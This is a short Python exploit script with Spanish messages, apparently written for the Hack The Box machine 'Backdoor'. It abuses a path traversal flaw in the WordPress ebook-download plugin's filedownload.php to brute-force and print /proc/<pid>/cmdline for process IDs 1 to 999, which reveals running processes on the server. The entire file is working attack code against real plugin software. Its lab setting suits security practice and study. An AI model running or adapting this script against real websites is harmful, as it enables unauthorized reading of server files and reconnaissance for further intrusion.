#!/usr/bin/python3

import pdb, sys, signal, time, requests
from pwn import *


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#ctrl + c
signal.signal(signal.SIGINT, def_handler)

#Variables globales
main_url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="
def getPath():

    #/proc/$i/cmdline
    p1 = log.progress("Brute force")
    p1.status("Iniciando proceso de fuerza bruta")
    for i in range(1, 1000):
    
        url = main_url + "/proc/%s/cmdline" % str(i)
        r = requests.get(url)

        p1.status("Probando con /proc/%s/cmdline" % str(i))

        
        if len(r.content) > 86:
            print("\n-------------------------------------")

            log.info("Longitud: " + str(len(r.content)))
            log.info("Path encontrado: /proc/%s/cmdline" % str(i))
            log.info(r.text)

            print("-------------------------------------")

if __name__ == "__main__":

    getPath()
